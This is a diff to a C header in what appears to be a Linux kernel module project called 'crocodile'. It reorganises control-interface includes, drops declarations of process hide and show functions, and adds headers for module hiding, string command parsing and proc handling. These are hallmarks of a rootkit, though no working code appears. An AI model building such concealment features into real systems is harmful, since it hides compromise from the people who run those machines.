@@ -16,15 +16,13 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_
-#define _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_
+#ifndef _CROCODILE_LKM_CTRL_CTRL_H_
+#define _CROCODILE_LKM_CTRL_CTRL_H_
 
-#include "types.h"
 #include "ctrl/ioctl.h"
+#include "ctrl/details/module_hide.h"
+#include "ctrl/details/parser_str_cmd.h"
+#include "ctrl/details/proc.h"
 
-int ioc_hide_pid(module_dev_t* p_dev, pid_t pid);
-
-int ioc_show_pid(module_dev_t* p_dev, pid_t pid);
-
-#endif /* _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_ */
+#endif /* _CROCODILE_LKM_CTRL_CTRL_H_ */
 
